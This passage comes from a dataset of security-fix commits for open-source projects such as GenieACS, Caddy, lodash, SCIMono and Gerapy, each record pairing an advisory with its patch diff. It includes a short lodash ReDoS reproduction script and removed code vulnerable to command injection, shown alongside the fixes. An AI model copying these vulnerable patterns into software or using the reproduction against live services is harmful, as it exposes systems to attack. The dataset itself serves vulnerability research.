log2(Tensor[0].Dim[0] )) <= 32.\\n@@ -82,6 +82,7 @@ TfLiteStatus Resize(TfLiteContext* context, TfLiteNode* node) {\\n   const TfLiteTensor* input;\\n   TF_LITE_ENSURE_OK(context, GetInputSafe(context, node, 1, &input));\\n   TF_LITE_ENSURE(context, NumDimensions(input) >= 1);\\n+  TF_LITE_ENSURE(context, SizeOfDimension(input, 0) >= 1);\\n \\n   if (NumInputs(node) == 3) {\\n     const TfLiteTensor* weight;'}}","message_norm":"prevent division by 0 in lsh projection.\n\npiperorigin-revid: 387225857\nchange-id: iaeb572a763618c64f503e0026f6dd9fd769bf50c","language":"en","entities":"[('prevent', 'ACTION', ''), ('division by 0', 'SECWORD', ''), ('387225857', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/lite\/kernels\/lsh_projection.cc'])","num_files":1.0},{"index":63,"vuln_id":"GHSA-2877-693q-pj33","cwe_id":"{'CWE-78'}","score":9.8,"chain":"{'https:\/\/github.com\/genieacs\/genieacs\/commit\/7f295beeecc1c1f14308a93c82413bb334045af6'}","dataset":"osv","summary":"OS Command Injection in GenieACS In GenieACS 1.2.x before 1.2.8, the UI interface API is vulnerable to unauthenticated OS command injection via the ping host argument (lib\/ui\/api.ts and lib\/ping.ts). The vulnerability arises from insufficient input validation combined with a missing authorization check.","published_date":"2022-03-07","chain_len":1,"project":"https:\/\/github.com\/genieacs\/genieacs","commit_href":"https:\/\/github.com\/genieacs\/genieacs\/commit\/7f295beeecc1c1f14308a93c82413bb334045af6","commit_sha":"7f295beeecc1c1f14308a93c82413bb334045af6","patch":"SINGLE","chain_ord":"['7f295beeecc1c1f14308a93c82413bb334045af6']","before_first_fix_commit":"{'2ac536bf8f2dd03c24b2eff35b69578b4efae94e'}","last_fix_commit":"7f295beeecc1c1f14308a93c82413bb334045af6","chain_ord_pos":1.0,"commit_datetime":"10\/14\/2021, 07:33:35","message":"Validate host arg passed to ping\n\nFixes remote code execution vulnerability reported by Alex Hordijk.","author":"Zaid Abdulla","comments":null,"stats":"{'additions': 13, 'deletions': 0, 'total': 13}","files":"{'lib\/ping.ts': {'additions': 13, 'deletions': 0, 'changes': 13, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/genieacs\/genieacs\/raw\/7f295beeecc1c1f14308a93c82413bb334045af6\/lib%2Fping.ts', 'patch': '@@ -19,6 +19,7 @@\\n \\n import { platform } from \"os\";\\n import { exec } from \"child_process\";\\n+import { domainToASCII } from \"url\";\\n \\n export interface PingResult {\\n   packetsTransmitted: number;\\n@@ -30,11 +31,23 @@ export interface PingResult {\\n   mdev: number;\\n }\\n \\n+function isValidHost(host: string): boolean {\\n+  \/\/ Valid chars in IPv4, IPv6, domain names\\n+  if (\/^[a-zA-Z0-9\\\\-.:[\\\\]-]+$\/.test(host)) return true;\\n+\\n+  \/\/ Check if input is an IDN convert to Punycode\\n+  \/\/ Can\\'t merge with above because domainToASCII doesn\\'t accept IP addresses\\n+  return \/^[a-zA-Z0-9\\\\-.:[\\\\]-]+$\/.test(domainToASCII(host));\\n+}\\n+\\n export function ping(\\n   host: string,\\n   callback: (err: Error, res?: PingResult, stdout?: string) => void\\n ): void {\\n   let cmd: string, parseRegExp1: RegExp, parseRegExp2: RegExp;\\n+  \/\/ Validate input to prevent possible remote code execution\\n+  \/\/ Credit to Alex Hordijk for reporting this vulnerability\\n+  if (!isValidHost(host)) return callback(new Error(\"Invalid host\"));\\n   host = host.replace(\"[\", \"\").replace(\"]\", \"\");\\n   switch (platform()) {\\n     case \"linux\":'}}","message_norm":"validate host arg passed to ping\n\nfixes remote code execution vulnerability reported by alex hordijk.","language":"en","entities":"[('validate', 'ACTION', ''), ('fixes', 'ACTION', ''), ('remote code execution', 'SECWORD', ''), ('vulnerability', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/ping.ts'])","num_files":1.0},{"index":70,"vuln_id":"GHSA-2927-hv3p-f3vp","cwe_id":"{'CWE-601'}","score":0.0,"chain":"{'https:\/\/github.com\/caddyserver\/caddy\/pull\/4499\/commits\/b23bdcf99cfbd09d50555a999a16468404789230'}","dataset":"osv","summary":"Open redirect in caddy Caddy v2.4 was discovered to contain an open redirect vulnerability. A remote unauthenticated attacker may exploit this vulnerability to redirect users to arbitrary web URLs by tricking the victim users to click on crafted links.","published_date":"2022-06-03","chain_len":1,"project":"https:\/\/github.com\/caddyserver\/caddy","commit_href":"https:\/\/github.com\/caddyserver\/caddy\/pull\/4499\/commits\/b23bdcf99cfbd09d50555a999a16468404789230","commit_sha":"b23bdcf99cfbd09d50555a999a16468404789230","patch":"SINGLE","chain_ord":"['b23bdcf99cfbd09d50555a999a16468404789230']","before_first_fix_commit":"{'5333c3528bd2badf1676efcced322d151e3706c8'}","last_fix_commit":"b23bdcf99cfbd09d50555a999a16468404789230","chain_ord_pos":1.0,"commit_datetime":"12\/30\/2021, 04:31:51","message":"caddyhttp: Fix `MatchPath` sanitizing\n\nThis is a followup to #4407, in response to a report on the forums: https:\/\/caddy.community\/t\/php-fastcgi-phishing-redirection\/14542\n\nTurns out that doing `TrimRight` to remove trailing dots, _before_ cleaning the path, will cause double-dots at the end of the path to not be cleaned away as they should. We should instead remove the dots _after_ cleaning.","author":"Francis Lavoie","comments":null,"stats":"{'additions': 5, 'deletions': 5, 'total': 10}","files":"{'modules\/caddyhttp\/matchers.go': {'additions': 5, 'deletions': 5, 'changes': 10, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/caddyserver\/caddy\/raw\/b23bdcf99cfbd09d50555a999a16468404789230\/modules%2Fcaddyhttp%2Fmatchers.go', 'patch': '@@ -325,18 +325,18 @@ func (m MatchPath) Match(r *http.Request) bool {\\n \\n \\tlowerPath := strings.ToLower(unescapedPath)\\n \\n+\\t\/\/ Clean the path, merges doubled slashes, etc.\\n+\\t\/\/ This ensures maliciously crafted requests can\\'t bypass\\n+\\t\/\/ the path matcher. See #4407\\n+\\tlowerPath = path.Clean(lowerPath)\\n+\\n \\t\/\/ see #2917; Windows ignores trailing dots and spaces\\n \\t\/\/ when accessing files (sigh), potentially causing a\\n \\t\/\/ security risk (cry) if PHP files end up being served\\n \\t\/\/ as static files, exposing the source code, instead of\\n \\t\/\/ being matched by *.php to be treated as PHP scripts\\n \\tlowerPath = strings.TrimRight(lowerPath, \". \")\\n \\n-\\t\/\/ Clean the path, merges doubled slashes, etc.\\n-\\t\/\/ This ensures maliciously crafted requests can\\'t bypass\\n-\\t\/\/ the path matcher. See #4407\\n-\\tlowerPath = path.Clean(lowerPath)\\n-\\n \\t\/\/ Cleaning may remove the trailing slash, but we want to keep it\\n \\tif lowerPath != \"\/\" && strings.HasSuffix(r.URL.Path, \"\/\") {\\n \\t\\tlowerPath = lowerPath + \"\/\"'}}","message_norm":"caddyhttp: fix `matchpath` sanitizing\n\nthis is a followup to #4407, in response to a report on the forums: https:\/\/caddy.community\/t\/php-fastcgi-phishing-redirection\/14542\n\nturns out that doing `trimright` to remove trailing dots, _before_ cleaning the path, will cause double-dots at the end of the path to not be cleaned away as they should. we should instead remove the dots _after_ cleaning.","language":"en","entities":"[('fix', 'ACTION', ''), ('sanitizing', 'SECWORD', ''), ('#4407', 'ISSUE', ''), ('https:\/\/caddy.community\/t\/php-fastcgi-phishing-redirection\/14542', 'URL', ''), ('remove', 'ACTION', ''), ('remove', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['modules\/caddyhttp\/matchers.go'])","num_files":1.0},{"index":72,"vuln_id":"GHSA-29mw-wpgm-hmr9","cwe_id":"{'CWE-400'}","score":5.3,"chain":"{'https:\/\/github.com\/lodash\/lodash\/pull\/5065\/commits\/02906b8191d3c100c193fe6f7b27d1c40f200bb7'}","dataset":"osv","summary":"Regular Expression Denial of Service (ReDoS) in lodash All versions of package lodash prior to 4.17.21 are vulnerable to Regular Expression Denial of Service (ReDoS) via the toNumber, trim and trimEnd functions. Steps to reproduce (provided by reporter Liyuan Chen): var lo = require('lodash'); function build_blank (n) { var ret = \"1\" for (var i = 0; i < n; i++) { ret += \" \" } return ret + \"1\"; } var s = build_blank(50000) var time0 = Date.now(); lo.trim(s) var time_cost0 = Date.now() - time0; console.log(\"time_cost0: \" + time_cost0) var time1 = Date.now(); lo.toNumber(s) var time_cost1 = Date.now() - time1; console.log(\"time_cost1: \" + time_cost1) var time2 = Date.now(); lo.trimEnd(s) var time_cost2 = Date.now() - time2; console.log(\"time_cost2: \" + time_cost2)","published_date":"2022-01-06","chain_len":1,"project":"https:\/\/github.com\/lodash\/lodash","commit_href":"https:\/\/github.com\/lodash\/lodash\/pull\/5065\/commits\/02906b8191d3c100c193fe6f7b27d1c40f200bb7","commit_sha":"02906b8191d3c100c193fe6f7b27d1c40f200bb7","patch":"SINGLE","chain_ord":"['02906b8191d3c100c193fe6f7b27d1c40f200bb7']","before_first_fix_commit":"{'ded9bc66583ed0b4e3b7dc906206d40757b4a90a'}","last_fix_commit":"02906b8191d3c100c193fe6f7b27d1c40f200bb7","chain_ord_pos":1.0,"commit_datetime":"01\/26\/2021, 22:17:05","message":"perf: improve performance of `toNumber`, `trim` and `trimEnd` on large input strings","author":"Micha\u0142 Lipi\u0144ski","comments":null,"stats":"{'additions': 36, 'deletions': 7, 'total': 43}","files":"{'lodash.js': {'additions': 36, 'deletions': 7, 'changes': 43, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/lodash\/lodash\/raw\/02906b8191d3c100c193fe6f7b27d1c40f200bb7\/lodash.js', 'patch': \"@@ -152,10 +152,11 @@\\n   var reRegExpChar = \/[\\\\\\\\^$.*+?()[\\\\]{}|]\/g,\\n       reHasRegExpChar = RegExp(reRegExpChar.source);\\n \\n-  \/** Used to match leading and trailing whitespace. *\/\\n-  var reTrim = \/^\\\\s+|\\\\s+$\/g,\\n-      reTrimStart = \/^\\\\s+\/,\\n-      reTrimEnd = \/\\\\s+$\/;\\n+  \/** Used to match leading whitespace. *\/\\n+  var reTrimStart = \/^\\\\s+\/;\\n+\\n+  \/** Used to match a single whitespace character. *\/\\n+  var reWhitespace = \/\\\\s\/;\\n \\n   \/** Used to match wrap detail comments. *\/\\n   var reWrapComment = \/\\\\{(?:\\\\n\\\\\/\\\\* \\\\[wrapped with .+\\\\] \\\\*\\\\\/)?\\\\n?\/,\\n@@ -993,6 +994,19 @@\\n     });\\n   }\\n \\n+  \/**\\n+   * The base implementation of `_.trim`.\\n+   *\\n+   * @private\\n+   * @param {string} string The string to trim.\\n+   * @returns {string} Returns the trimmed string.\\n+   *\/\\n+  function baseTrim(string) {\\n+    return string\\n+      ? string.slice(0, trimmedEndIndex(string) + 1).replace(reTrimStart, '')\\n+      : string;\\n+  }\\n+\\n   \/**\\n    * The base implementation of `_.unary` without support for storing metadata.\\n    *\\n@@ -1326,6 +1340,21 @@\\n       : asciiToArray(string);\\n   }\\n \\n+  \/**\\n+   * Used by `_.trim` and `_.trimEnd` to get the index of the last non-whitespace\\n+   * character of `string`.\\n+   *\\n+   * @private\\n+   * @param {string} string The string to inspect.\\n+   * @returns {number} Returns the index of the last non-whitespace character.\\n+   *\/\\n+  function trimmedEndIndex(string) {\\n+    var index = string.length;\\n+\\n+    while (index-- && reWhitespace.test(string.charAt(index))) {}\\n+    return index;\\n+  }\\n+\\n   \/**\\n    * Used by `_.unescape` to convert HTML entities to characters.\\n    *\\n@@ -12494,7 +12523,7 @@\\n       if (typeof value != 'string') {\\n         return value === 0 ? value : +value;\\n       }\\n-      value = value.replace(reTrim, '');\\n+      value = baseTrim(value);\\n       var isBinary = reIsBinary.test(value);\\n       return (isBinary || reIsOctal.test(value))\\n         ? freeParseInt(value.slice(2), isBinary ? 2 : 8)\\n@@ -14979,7 +15008,7 @@\\n     function trim(string, chars, guard) {\\n       string = toString(string);\\n       if (string && (guard || chars === undefined)) {\\n-        return string.replace(reTrim, '');\\n+        return baseTrim(string);\\n       }\\n       if (!string || !(chars = baseToString(chars))) {\\n         return string;\\n@@ -15014,7 +15043,7 @@\\n     function trimEnd(string, chars, guard) {\\n       string = toString(string);\\n       if (string && (guard || chars === undefined)) {\\n-        return string.replace(reTrimEnd, '');\\n+        return string.slice(0, trimmedEndIndex(string) + 1);\\n       }\\n       if (!string || !(chars = baseToString(chars))) {\\n         return string;\"}}","message_norm":"perf: improve performance of `tonumber`, `trim` and `trimend` on large input strings","language":"en","entities":"[('improve', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lodash.js'])","num_files":1.0},{"index":73,"vuln_id":"GHSA-29q4-gxjq-rx5c","cwe_id":"{'CWE-59', 'CWE-690', 'CWE-917', 'CWE-74', 'CWE-62', 'CWE-77'}","score":0.0,"chain":"{'https:\/\/github.com\/SAP\/scimono\/commit\/413b5d75fa94e77876af0e47be76475a23745b80'}","dataset":"osv","summary":"Remote Code Execution in SCIMono ### Impact\nIt is possible for attacker to inject and execute java expression and compromising the availability and integrity of the system.\n\n### Patches\nThe issue was fixed on  [0.0.19 version](https:\/\/mvnrepository.com\/artifact\/com.sap.scimono\/scimono-server\/0.0.19)","published_date":"2021-02-10","chain_len":1,"project":"https:\/\/github.com\/SAP\/scimono","commit_href":"https:\/\/github.com\/SAP\/scimono\/commit\/413b5d75fa94e77876af0e47be76475a23745b80","commit_sha":"413b5d75fa94e77876af0e47be76475a23745b80","patch":"SINGLE","chain_ord":"['413b5d75fa94e77876af0e47be76475a23745b80']","before_first_fix_commit":"{'8a09b8cfbb4cb797efac745c7ec3924569513844'}","last_fix_commit":"413b5d75fa94e77876af0e47be76475a23745b80","chain_ord_pos":1.0,"commit_datetime":"11\/30\/2020, 14:35:19","message":"Escape Java EL in validation message before interpolation (#117)","author":"Aleydin Karaimin","comments":null,"stats":"{'additions': 8, 'deletions': 1, 'total': 9}","files":"{'scimono-server\/src\/main\/java\/com\/sap\/scimono\/entity\/schema\/validation\/ValidationUtil.java': {'additions': 8, 'deletions': 1, 'changes': 9, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/SAP\/scimono\/raw\/413b5d75fa94e77876af0e47be76475a23745b80\/scimono-server%2Fsrc%2Fmain%2Fjava%2Fcom%2Fsap%2Fscimono%2Fentity%2Fschema%2Fvalidation%2FValidationUtil.java', 'patch': '@@ -1,13 +1,20 @@\\n \\n package com.sap.scimono.entity.schema.validation;\\n \\n+import java.util.regex.Pattern;\\n+\\n import javax.validation.ConstraintValidatorContext;\\n \\n class ValidationUtil {\\n+  private static final Pattern EXPRESSION_LANGUAGE_CHARACTERS = Pattern.compile(\"([${}])\");\\n \\n   public static void interpolateErrorMessage(ConstraintValidatorContext context, String errorMessage) {\\n     context.disableDefaultConstraintViolation();\\n-    context.buildConstraintViolationWithTemplate(errorMessage).addConstraintViolation();\\n+    context.buildConstraintViolationWithTemplate(escapeExpressionLanguage(errorMessage)).addConstraintViolation();\\n+  }\\n+\\n+  private static String escapeExpressionLanguage(String text) {\\n+    return EXPRESSION_LANGUAGE_CHARACTERS.matcher(text).replaceAll( \"\\\\\\\\\\\\\\\\$1\" );\\n   }\\n \\n }'}}","message_norm":"escape java el in validation message before interpolation (#117)","language":"it","entities":"[('escape', 'SECWORD', ''), ('#117', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['scimono-server\/src\/main\/java\/com\/sap\/scimono\/entity\/schema\/validation\/ValidationUtil.java'])","num_files":1.0},{"index":75,"vuln_id":"GHSA-29vr-79w7-p649","cwe_id":"{'CWE-863'}","score":9.8,"chain":"{'https:\/\/github.com\/Gerapy\/Gerapy\/commit\/49bcb19be5e0320e7e1535f34fe00f16a3cf3b28'}","dataset":"osv","summary":"Incorrect Authorization in Gerapy An Access Control vunerabiity exists in Gerapy v 0.9.7 via the spider parameter in project_configure function.","published_date":"2022-03-11","chain_len":1,"project":"https:\/\/github.com\/Gerapy\/Gerapy","commit_href":"https:\/\/github.com\/Gerapy\/Gerapy\/commit\/49bcb19be5e0320e7e1535f34fe00f16a3cf3b28","commit_sha":"49bcb19be5e0320e7e1535f34fe00f16a3cf3b28","patch":"SINGLE","chain_ord":"['49bcb19be5e0320e7e1535f34fe00f16a3cf3b28']","before_first_fix_commit":"{'f1cd46d80328497c016fbac12c9239b9dcaef047'}","last_fix_commit":"49bcb19be5e0320e7e1535f34fe00f16a3cf3b28","chain_ord_pos":1.0,"commit_datetime":"12\/26\/2021, 09:50:00","message":"fix remote execute","author":"Germey","comments":null,"stats":"{'additions': 56, 'deletions': 40, 'total': 96}","files":"{'gerapy\/server\/core\/views.py': {'additions': 56, 'deletions': 40, 'changes': 96, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/Gerapy\/Gerapy\/raw\/49bcb19be5e0320e7e1535f34fe00f16a3cf3b28\/gerapy%2Fserver%2Fcore%2Fviews.py', 'patch': '@@ -2,7 +2,12 @@\\n from pathlib import Path\\n from urllib.parse import unquote\\n import base64\\n-import json, os, requests, time, pytz, pymongo\\n+import json\\n+import os\\n+import requests\\n+import time\\n+import pytz\\n+import pymongo\\n from shutil import rmtree\\n from requests.exceptions import ConnectionError\\n from os.path import join, exists\\n@@ -173,7 +178,8 @@ def spider_list(request, client_id, project_name):\\n         client = Client.objects.get(id=client_id)\\n         scrapyd = get_scrapyd(client)\\n         spiders = scrapyd.list_spiders(project_name)\\n-        spiders = [{\\'name\\': spider, \\'id\\': index + 1} for index, spider in enumerate(spiders)]\\n+        spiders = [{\\'name\\': spider, \\'id\\': index + 1}\\n+                   for index, spider in enumerate(spiders)]\\n         return JsonResponse(spiders)\\n \\n \\n@@ -242,23 +248,25 @@ def project_configure(request, project_name):\\n     if request.method == \\'GET\\':\\n         project = Project.objects.get(name=project_name)\\n         project = model_to_dict(project)\\n-        project[\\'configuration\\'] = json.loads(project[\\'configuration\\']) if project[\\'configuration\\'] else None\\n+        project[\\'configuration\\'] = json.loads(\\n+            project[\\'configuration\\']) if project[\\'configuration\\'] else None\\n         return JsonResponse(project)\\n-    \\n+\\n     # update configuration\\n     elif request.method == \\'POST\\':\\n         project = Project.objects.filter(name=project_name)\\n         data = json.loads(request.body)\\n-        configuration = json.dumps(data.get(\\'configuration\\'), ensure_ascii=False)\\n+        configuration = json.dumps(\\n+            data.get(\\'configuration\\'), ensure_ascii=False)\\n         project.update(**{\\'configuration\\': configuration})\\n-        \\n         # for safe protection\\n-        project_name = re.sub(\\'[\\\\!\\\\@\\\\#\\\\$\\\\;\\\\&\\\\*\\\\~\\\\\"\\\\\\'\\\\{\\\\}\\\\]\\\\[\\\\-\\\\+\\\\%\\\\^]+\\', \\'\\', project_name)\\n+        project_name = re.sub(\\n+            \\'[\\\\s\\\\!\\\\@\\\\#\\\\$\\\\;\\\\&\\\\*\\\\~\\\\\"\\\\\\'\\\\{\\\\}\\\\]\\\\[\\\\-\\\\+\\\\%\\\\^]+\\', \\'\\', project_name)\\n         # execute generate cmd\\n-        cmd = \\' \\'.join([\\'gerapy\\', \\'generate\\', project_name])\\n-        p = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)\\n+        cmd = [\\'gerapy\\', \\'generate\\', project_name]\\n+        p = Popen(cmd, shell=False, stdin=PIPE, stdout=PIPE, stderr=PIPE)\\n         stdout, stderr = bytes2str(p.stdout.read()), bytes2str(p.stderr.read())\\n-        \\n+\\n         if not stderr:\\n             return JsonResponse({\\'status\\': \\'1\\'})\\n         else:\\n@@ -294,7 +302,8 @@ def project_create(request):\\n         data[\\'configurable\\'] = 1\\n         project, result = Project.objects.update_or_create(**data)\\n         # generate a single project folder\\n-        path = join(os.path.abspath(join(os.getcwd(), PROJECTS_FOLDER)), data[\\'name\\'])\\n+        path = join(os.path.abspath(\\n+            join(os.getcwd(), PROJECTS_FOLDER)), data[\\'name\\'])\\n         os.mkdir(path)\\n         return JsonResponse(model_to_dict(project))\\n \\n@@ -334,12 +343,13 @@ def project_clone(request):\\n         if not address.startswith(\\'http\\'):\\n             return JsonResponse({\\'status\\': False})\\n         address = address + \\'.git\\' if not address.endswith(\\'.git\\') else address\\n-        cmd = \\'git clone {address} {target}\\'.format(address=address, target=join(PROJECTS_FOLDER, Path(address).stem))\\n+        cmd = [\\'git\\', \\'clone\\', \\'address\\', join(PROJECTS_FOLDER, Path(address).stem)]\\n         logger.debug(\\'clone cmd %s\\', cmd)\\n-        p = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)\\n+        p = Popen(cmd, shell=False, stdin=PIPE, stdout=PIPE, stderr=PIPE)\\n         stdout, stderr = bytes2str(p.stdout.read()), bytes2str(p.stderr.read())\\n         logger.debug(\\'clone run result %s\\', stdout)\\n-        if stderr: logger.error(stderr)\\n+        if stderr:\\n+            logger.error(stderr)\\n         return JsonResponse({\\'status\\': True}) if not stderr else JsonResponse({\\'status\\': False})\\n \\n \\n@@ -393,10 +403,12 @@ def project_version(request, client_id, project_name):\\n                 return JsonResponse({\\'message\\': \\'Connect Error\\'}, status=500)\\n             if len(versions) > 0:\\n                 version = versions[-1]\\n-                deployed_at = timezone.datetime.fromtimestamp(int(version), tz=pytz.timezone(TIME_ZONE))\\n+                deployed_at = timezone.datetime.fromtimestamp(\\n+                    int(version), tz=pytz.timezone(TIME_ZONE))\\n             else:\\n                 deployed_at = None\\n-            deploy, result = Deploy.objects.update_or_create(client=client, project=project, deployed_at=deployed_at)\\n+            deploy, result = Deploy.objects.update_or_create(\\n+                client=client, project=project, deployed_at=deployed_at)\\n         # return deploy json info\\n         return JsonResponse(model_to_dict(deploy))\\n \\n@@ -446,7 +458,7 @@ def project_build(request, project_name):\\n     # get project folder\\n     path = os.path.abspath(join(os.getcwd(), PROJECTS_FOLDER))\\n     project_path = join(path, project_name)\\n-    \\n+\\n     # get build version\\n     if request.method == \\'GET\\':\\n         egg = find_egg(project_path)\\n@@ -470,7 +482,7 @@ def project_build(request, project_name):\\n         # transfer model to dict then dumps it to json\\n         data = model_to_dict(model)\\n         return JsonResponse(data)\\n-    \\n+\\n     # build operation manually by clicking button\\n     elif request.method == \\'POST\\':\\n         data = json.loads(request.body)\\n@@ -483,7 +495,8 @@ def project_build(request, project_name):\\n         built_at = timezone.now()\\n         # if project does not exists in db, create it\\n         if not Project.objects.filter(name=project_name):\\n-            Project(name=project_name, description=description, built_at=built_at, egg=egg).save()\\n+            Project(name=project_name, description=description,\\n+                    built_at=built_at, egg=egg).save()\\n             model = Project.objects.get(name=project_name)\\n         # if project exists, update egg, description, built_at info\\n         else:\\n@@ -526,17 +539,16 @@ def project_parse(request, project_name):\\n         body = data.get(\\'body\\', \\'\\')\\n         if args.get(\\'method\\').lower() != \\'get\\':\\n             args[\\'body\\'] = \"\\'\" + json.dumps(body, ensure_ascii=False) + \"\\'\"\\n-        \\n-        args_cmd = \\' \\'.join(\\n-            [\\'--{arg} {value}\\'.format(arg=arg, value=value) for arg, value in args.items()])\\n-        logger.debug(\\'args cmd %s\\', args_cmd)\\n-        cmd = \\'gerapy parse {args_cmd} {project_path} {spider_name}\\'.format(\\n-            args_cmd=args_cmd,\\n-            project_path=project_path,\\n-            spider_name=spider_name\\n-        )\\n+\\n+        args_array = []\\n+        for arg, value in args.items():\\n+            args_array.append(f\\'--{arg}\\')\\n+            args_array.append(f\\'{value}\\')\\n+        cmd = [\\'gerapy\\', \\'parse\\'] + args_array + [project_path] + [spider_name]\\n+        print(\\'cmd\\', cmd)\\n         logger.debug(\\'parse cmd %s\\', cmd)\\n-        p = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE, close_fds=True)\\n+        p = Popen(cmd, shell=False, stdin=PIPE,\\n+                         stdout=PIPE, stderr=PIPE, close_fds=True)\\n         stdout, stderr = bytes2str(p.stdout.read()), bytes2str(p.stderr.read())\\n         logger.debug(\\'stdout %s, stderr %s\\', stdout, stderr)\\n         if not stderr:\\n@@ -645,7 +657,6 @@ def job_list(request, client_id, project_name):\\n                 job[\\'status\\'] = status\\n                 jobs.append(job)\\n         return JsonResponse(jobs)\\n-    \\n \\n \\n @api_view([\\'GET\\'])\\n@@ -663,7 +674,8 @@ def job_log(request, client_id, project_name, spider_name, job_id):\\n     if request.method == \\'GET\\':\\n         client = Client.objects.get(id=client_id)\\n         # get log url\\n-        url = log_url(client.ip, client.port, project_name, spider_name, job_id)\\n+        url = log_url(client.ip, client.port,\\n+                      project_name, spider_name, job_id)\\n         # get last 1000 bytes of log\\n         response = requests.get(url, timeout=5, headers={\\n             \\'Range\\': \\'bytes=-1000\\'\\n@@ -765,7 +777,8 @@ def monitor_create(request):\\n     if request.method == \\'POST\\':\\n         data = json.loads(request.body)\\n         data = data[\\'form\\']\\n-        data[\\'configuration\\'] = json.dumps(data[\\'configuration\\'], ensure_ascii=False)\\n+        data[\\'configuration\\'] = json.dumps(\\n+            data[\\'configuration\\'], ensure_ascii=False)\\n         monitor = Monitor.objects.create(**data)\\n         return JsonResponse(model_to_dict(monitor))\\n \\n@@ -785,7 +798,8 @@ def task_create(request):\\n                                    name=data.get(\\'name\\'),\\n                                    spider=data.get(\\'spider\\'),\\n                                    trigger=data.get(\\'trigger\\'),\\n-                                   configuration=json.dumps(data.get(\\'configuration\\'), ensure_ascii=False),\\n+                                   configuration=json.dumps(\\n+                                       data.get(\\'configuration\\'), ensure_ascii=False),\\n                                    modified=1)\\n         return JsonResponse({\\'result\\': \\'1\\', \\'data\\': model_to_dict(task)})\\n \\n@@ -803,7 +817,8 @@ def task_update(request, task_id):\\n         task = Task.objects.filter(id=task_id)\\n         data = json.loads(request.body)\\n         data[\\'clients\\'] = json.dumps(data.get(\\'clients\\'), ensure_ascii=False)\\n-        data[\\'configuration\\'] = json.dumps(data.get(\\'configuration\\'), ensure_ascii=False)\\n+        data[\\'configuration\\'] = json.dumps(\\n+            data.get(\\'configuration\\'), ensure_ascii=False)\\n         data[\\'modified\\'] = 1\\n         task.update(**data)\\n         return JsonResponse(model_to_dict(Task.objects.get(id=task_id)))\\n@@ -823,11 +838,10 @@ def task_remove(request, task_id):\\n         clients = clients_of_task(task)\\n         for client in clients:\\n             job_id = get_job_id(client, task)\\n-            DjangoJob.objects.filter(name=job_id).delete()\\n+            DjangoJob.objects.filter(id=job_id).delete()\\n         # delete task\\n         Task.objects.filter(id=task_id).delete()\\n         return JsonResponse({\\'result\\': \\'1\\'})\\n-    \\n \\n \\n @api_view([\\'GET\\'])\\n@@ -875,12 +889,14 @@ def task_status(request, task_id):\\n         clients = clients_of_task(task)\\n         for client in clients:\\n             job_id = get_job_id(client, task)\\n-            jobs = DjangoJob.objects.filter(name=job_id)\\n+            jobs = DjangoJob.objects.filter(id=job_id)\\n             logger.debug(\\'jobs from djangojob %s\\', jobs)\\n             # if job does not exist, for date mode exceed time\\n-            if not jobs: continue\\n-            job = DjangoJob.objects.get(name=job_id)\\n-            executions = serialize(\\'json\\', DjangoJobExecution.objects.filter(job=job))\\n+            if not jobs:\\n+                continue\\n+            job = DjangoJob.objects.get(id=job_id)\\n+            executions = serialize(\\n+                \\'json\\', DjangoJobExecution.objects.filter(job=job))\\n             result.append({\\n                 \\'client\\': model_to_dict(client),\\n                 \\'next\\': job.next_run_time,'}}","message_norm":"fix remote execute","language":"ro","entities":"[('fix', 'ACTION', ''), ('remote execute', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['gerapy\/server\/core\/views.py'])","num_files":1.0},{"index":78,"vuln_id":"GHSA-2ccx-2gf3-8xvv","cwe_id":"{'CWE-346'}","score":6.8,"chain":"{'https:\/\/github.com\/getkirby-v2\/panel\/commit\/7f9ac1876bacb89fd8f142f5e561a02ebb725baa'}","dataset":"osv","summary":"Kirby .dev domains and some reverse proxy setups were treated as local ### Impact\n\n#### About our registration block\n\nIn order to protect new installations on public servers that don't have an admin account for the Panel yet, we block account registration there by default. This is a security feature, which we implemented years ago in Kirby 2. It helps to avoid that you forget registering your first admin account on a public server. \n\nIn this case \u2013 without our security block \u2013 someone else might theoretically be able to find your site, find out it's running on Kirby, find the Panel and then register the account first. It's an unlikely situation, but it's still a certain risk.\n\nTo be able to register the first Panel account on a public server, you have to enforce the installer via a config setting. This helps to push all users to the best practice of registering your first Panel account on your local machine and upload it together with the rest of the site. \n\n#### The issue\n\nAs noted by [Jukka Rautanen](https:\/\/github.com\/jukra), this installation block implementation in Kirby versions before 3.3.6 still assumed that .dev domains are local domains, which is no longer true. In the meantime, those domains became publicly available. This means that our installation block is no longer working as expected if you use a .dev domain for your Kirby site.\n\nIn fixing this issue, we've also found out that the local installation check may also fail if your site is behind a reverse proxy. \n\n#### Am I affected?\n\nYou are only affected if:\n\n1. you use a .dev domain or your site is behind a reverse proxy &\n2. you have not yet registered your first Panel account on the public server & \n3. someone finds your site and tries to login at `yourdomain.dev\/panel` before you register your first account.\n\nYou are not affected if you have already created one or multiple Panel accounts (no matter if on a .dev domain or behind a reverse proxy).\n\n### Patches\n\nThe problem has been patched in [Kirby 2.5.14](https:\/\/github.com\/getkirby-v2\/panel\/releases\/tag\/2.5.14) and [Kirby 3.3.6](https:\/\/github.com\/getkirby\/kirby\/releases\/tag\/3.3.6). Please update to one of these or a [later version](https:\/\/github.com\/getkirby\/kirby\/releases) to fix the vulnerability.\n\n**Note:** Kirby 2 reaches end of life on December 31, 2020. We therefore recommend to upgrade your Kirby 2 sites to Kirby 3. If you cannot upgrade, we still recommend to update to Kirby 2.5.14.\n\n### Workarounds\n\nKirby 2 sites on older releases can also be patched by applying the [changes from this 